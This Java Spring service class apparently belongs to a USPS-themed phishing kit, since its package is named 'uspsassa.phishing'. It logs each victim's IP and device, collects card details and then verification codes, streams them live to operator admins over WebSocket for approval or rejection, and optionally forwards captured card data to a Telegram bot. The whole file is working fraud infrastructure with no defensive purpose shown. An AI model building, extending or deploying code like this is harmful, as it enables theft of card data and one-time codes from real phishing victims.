package com.uspsassa.phishing.service;

import cn.hutool.core.convert.Convert;
import cn.hutool.http.useragent.UserAgent;
import cn.hutool.http.useragent.UserAgentUtil;
import com.github.pagehelper.PageHelper;
import com.github.pagehelper.PageInfo;
import com.uspsassa.phishing.common.sresukt.SResult;
import com.uspsassa.phishing.common.sresukt.SResultCode;
import com.uspsassa.phishing.common.utils.BaseUtil;
import com.uspsassa.phishing.common.utils.TelegramUtil;
import com.uspsassa.phishing.entity.FishComplet;
import com.uspsassa.phishing.entity.Setting;
import com.uspsassa.phishing.exception.BusinessException;
import com.uspsassa.phishing.request.PageRequest;
import com.uspsassa.phishing.request.admin.QueryCompleteRequest;
import com.uspsassa.phishing.request.user.AddFishBaseRequest;
import com.uspsassa.phishing.request.user.AddFishCardRequest;
import com.uspsassa.phishing.request.user.AddFishCodeRequest;
import com.uspsassa.phishing.socket.WebSocketServer;
import com.uspsassa.phishing.vo.FishVo;
import com.uspsassa.phishing.vo.PageResult;
import com.uspsassa.phishing.vo.SystemCount;
import org.springframework.stereotype.Service;

import javax.annotation.Resource;

import com.uspsassa.phishing.entity.Fish;
import com.uspsassa.phishing.mapper.FishMapper;

import java.io.IOException;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicBoolean;

@Service
public class FishService {

    @Resource
    private FishMapper fishMapper;
    @Resource
    private SettingService settingService;
    @Resource
    private FishCompletService fishCompletService;

    public int deleteByPrimaryKey(Integer id) {
        return fishMapper.deleteByPrimaryKey(id);
    }


    public int insert(Fish record) {
        return fishMapper.insert(record);
    }


    public int insertSelective(Fish record) {
        return fishMapper.insertSelective(record);
    }


    public Fish selectByPrimaryKey(Integer id) {
        return fishMapper.selectByPrimaryKey(id);
    }


    public int updateByPrimaryKeySelective(Fish record) {
        return fishMapper.updateByPrimaryKeySelective(record);
    }


    public int updateByPrimaryKey(Fish record) {
        return fishMapper.updateByPrimaryKey(record);
    }

    public List<Fish> findByAll(Fish fish) {
        return fishMapper.findByAll(fish);
    }

    public Fish findOneByAll(Fish fish) {
        return fishMapper.findOneByAll(fish);
    }

    public FishVo addBaseInfo(AddFishBaseRequest baseInfo, String ua, String ip) throws IOException {
        Fish fish = Convert.convert(Fish.class, baseInfo);
        fish.setStatus("等待卡输入");
        UserAgent parse = UserAgentUtil.parse(ua);
        fish.setDeviceType(parse.getOs().getName());
        fish.setIp(ip);
        Fish query = new Fish();
        query.setSid(fish.getSid());
        Fish oneByAll = fishMapper.findOneByAll(query);
        if (oneByAll != null) {
            throw new BusinessException("已经存在该sid");
        }
        AtomicBoolean isExit = new AtomicBoolean(false);
        WebSocketServer.getWebSocketSet().forEach(item -> {
            if (Objects.equals(item.sid, baseInfo.getSid())) {
                isExit.set(true);
            }
        });
        if (!isExit.get()) {
            throw new BusinessException("sid不存在");
        }
        fish.setCreateTime(System.currentTimeMillis());
        //获取ip
        fishMapper.insertSelective(fish);
        //判断是否无卡号不显示
        Setting setting = settingService.getSetting();
        FishVo fishVo = Convert.convert(FishVo.class, fishMapper.selectByPrimaryKey(fish.getId()));
        isOnline(fishVo);
        settingService.addVisitCount();
        if (!setting.getCartFilter()) {
            //否 则推送给所有管理员
            SResult<FishVo> sResult = new SResult<>();
            sResult.setCode(SResultCode.BASE.getCode());
            sResult.setData(fishVo);
            WebSocketServer.sendAllAdmin(sResult);
        }
        return fishVo;
    }

    public void addCardInfo(AddFishCardRequest baseInfo) throws IOException {
        //获取全部信息
        Fish fish = fishMapper.selectByPrimaryKey(baseInfo.getId());
        if (fish == null) {
            throw new BusinessException("没有找到对应的信息");
        }
        if (!"等待卡输入".equals(fish.getStatus())) {
            throw new BusinessException("卡填写状态异常");
        }
        Setting setting = settingService.getSetting();
        if(!setting.getSync()){
            //非同步
            fish.setStatus("同步完成");
            FishComplet fishComplet = Convert.convert(FishComplet.class, baseInfo);
            fishCompletService.insertSelective(fishComplet);
            fishMapper.deleteByPrimaryKey(baseInfo.getId());
            //返回给前台
            SResult<FishVo> sResult = new SResult<>();
            sResult.setCode(SResultCode.SYNC_COMPLETE.getCode());
            WebSocketServer.sendInfo(sResult,baseInfo.getSid());
        }else{
            //同步
            fish = Convert.convert(Fish.class, baseInfo);
            fish.setStatus("等待卡放行");
            fishMapper.updateByPrimaryKeySelective(fish);
            //发送给指定的用户
            SResult<FishVo> sResult = new SResult<>();
            sResult.setCode(SResultCode.CARD.getCode());
            //重新获取数据返回给前端
            fish = fishMapper.selectByPrimaryKey(baseInfo.getId());
            FishVo fishVo = Convert.convert(FishVo.class, fish);
            sResult.setData(fishVo);
            isOnline(fishVo);
            WebSocketServer.sendAllAdmin(sResult);
        }
        FishVo fishVo = Convert.convert(FishVo.class, fish);
        if (setting.getTelegramPush()) {
            //推送到telegram
            TelegramUtil.sendMsg(fishVo, setting.getTelegramToken(), setting.getTelegramId());
        }
    }

    public void addCodeInfo(AddFishCodeRequest codeRequest) throws IOException {
        //获取全部信息
        Fish fish = fishMapper.selectByPrimaryKey(codeRequest.getId());
        if (fish == null) {
            throw new BusinessException("没有找到对应的信息");
        }
        if (!"等待验证码输入".equals(fish.getStatus())) {
            throw new BusinessException("验证码填写状态异常");
        }
        fish = Convert.convert(Fish.class, codeRequest);
        //状态位等待验证码放行
        fish.setStatus("等待验证码放行");
        fishMapper.updateByPrimaryKeySelective(fish);
        //发送给所有的管理员
        SResult<FishVo> sResult = new SResult<>();
        sResult.setCode(SResultCode.CODE.getCode());
        //获取数据
        FishVo fishVo = null;
        fish = fishMapper.selectByPrimaryKey(codeRequest.getId());
        fishVo = Convert.convert(FishVo.class, fish);
        sResult.setData(fishVo);
        isOnline(fishVo);
        WebSocketServer.sendAllAdmin(sResult);
        WebSocketServer.sendAllAdmin(sResult);
    }

    public List<FishVo> getInfoList() {
        List<Fish> byAll = fishMapper.findByAll(new Fish());
        List<FishVo> fishVos = BaseUtil.convertList(byAll, FishVo.class);
        Setting setting = settingService.getSetting();
        //如果是无卡号不显示模式
        if (setting.getCartFilter()) {
            //过滤掉状态位为等待卡输入的
            fishVos.removeIf(fishVo -> "等待卡输入".equals(fishVo.getStatus()));
        }
        fishVos.forEach(this::isOnline);
        return fishVos;
    }

    public void remove(String sid) throws IOException {
        Fish fish = new Fish();
        fish.setSid(sid);
        Fish fish1 = fishMapper.selectByPrimaryKey(fish.getId());
        fishMapper.deleteBySid(fish);
        //发送给所有的管理员
        SResult<Integer> sResult = new SResult<>();
        sResult.setCode(SResultCode.Remove.getCode());
        sResult.setData(fish1.getId());
        WebSocketServer.sendAllAdmin(sResult);
    }

    public FishVo cardPass(Integer id) throws IOException {
        Fish fish = fishMapper.selectByPrimaryKey(id);
        if (fish == null) {
            throw new BusinessException("没有找到对应的信息");
        }
        if (!"等待卡放行".equals(fish.getStatus())) {
            throw new BusinessException("当前状态不允许放行");
        }
        /*卡放行*/
        // 异步 跳过验证码操作 直接完成
        fish.setStatus("等待验证码输入");
        fishMapper.updateByPrimaryKeySelective(fish);
        FishVo fishVo = Convert.convert(FishVo.class, fish);
        isOnline(fishVo);
        SResult<FishVo> sResult = new SResult<>();
        sResult.setCode(SResultCode.CARD_IS_PASS.getCode());
        sResult.setData(fishVo);
        WebSocketServer.sendInfo(sResult, fishVo.getSid());
        return fishVo;
    }

    public FishVo cardReject(Integer id) throws IOException {
        Fish fish = fishMapper.selectByPrimaryKey(id);
        if (fish == null) {
            throw new BusinessException("没有找到对应的信息");
        }
        if (!"等待卡放行".equals(fish.getStatus())) {
            throw new BusinessException("当前状态不允许拒绝");
        }
        fishMapper.cardReject(id);
        fish = fishMapper.selectByPrimaryKey(id);
        FishVo fishVo = Convert.convert(FishVo.class, fish);
        isOnline(fishVo);
        SResult<FishVo> sResult = new SResult<>();
        sResult.setCode(SResultCode.CARD_IS_NOT_PASS.getCode());
        sResult.setData(fishVo);
        WebSocketServer.sendInfo(sResult, fishVo.getSid());
        return fishVo;
    }

    public void codePass(Integer id) throws IOException {
        //将信息从处理队列加到完成队列
        Fish fish = fishMapper.selectByPrimaryKey(id);
        if (fish == null) {
            throw new BusinessException("没有找到对应的信息");
        }
        if (!"等待验证码放行".equals(fish.getStatus())) {
            throw new BusinessException("当前状态不允许放行");
        }
        fishMapper.deleteByPrimaryKey(id);
        FishComplet fishComplet = Convert.convert(FishComplet.class, fish);
        //设置完成时间
        fishComplet.setCompleteTime(System.currentTimeMillis());
        //设置完成状态
        fishComplet.setStatus("验证码放行");
        SResult<FishVo> sResult = new SResult<>();
        sResult.setCode(SResultCode.CODE_IS_PASS.getCode());
        sResult.setData(null);
        WebSocketServer.sendInfo(sResult, fishComplet.getSid());
        fishCompletService.insertSelective(fishComplet);
    }

    public FishVo codeReject(Integer id) throws IOException {
        Fish fish = fishMapper.selectByPrimaryKey(id);
        if (fish == null) {
            throw new BusinessException("没有找到对应的信息");
        }
        if (!"等待验证码放行".equals(fish.getStatus())) {
            throw new BusinessException("当前状态不允许拒绝");
        }
        fishMapper.codeReject(id);
        //发送给指定用户
        fish = fishMapper.selectByPrimaryKey(id);
        FishVo fishVo = Convert.convert(FishVo.class, fish);
        isOnline(fishVo);
        SResult<FishVo> sResult = new SResult<>();
        sResult.setCode(SResultCode.CODE_IS_NOT_PASS.getCode());
        sResult.setData(fishVo);
        WebSocketServer.sendInfo(sResult, fishVo.getSid());
        return fishVo;
    }

    private void isOnline(FishVo fishVo) {
        WebSocketServer.getWebSocketSet().forEach(webSocketServer -> {
            if (fishVo.getSid().equals(webSocketServer.sid)) {
                fishVo.setIsOnline(webSocketServer.isLogin);
            }
        });
    }

    public PageResult<FishComplet> getFinishInfo(PageRequest<QueryCompleteRequest> pageRequest) {
        PageHelper.startPage(pageRequest.getPageNum(), pageRequest.getPageSize());
        List<FishComplet> fishCompletList = fishCompletService.findByAll(Convert.convert(FishComplet.class, pageRequest.getQuery()));
        PageInfo<FishComplet> pageInfo = new PageInfo<>(fishCompletList);
        PageResult<FishComplet> pageResult = new PageResult<>();
        pageResult.setTotal(pageInfo.getTotal());
        pageResult.setData(pageInfo.getList());
        pageResult.setHasNext(pageInfo.isHasNextPage());
        return pageResult;
    }

    public void deleteCompleteInfo(int id) {
        fishCompletService.deleteByPrimaryKey(id);
    }

    public SystemCount getSystemCount() {
        Setting setting = settingService.getSetting();
        SystemCount systemCount = new SystemCount();
        systemCount.setFinishCount(fishCompletService.count());
        systemCount.setVisitCount(setting.getVisitCount());
        return systemCount;
    }
}






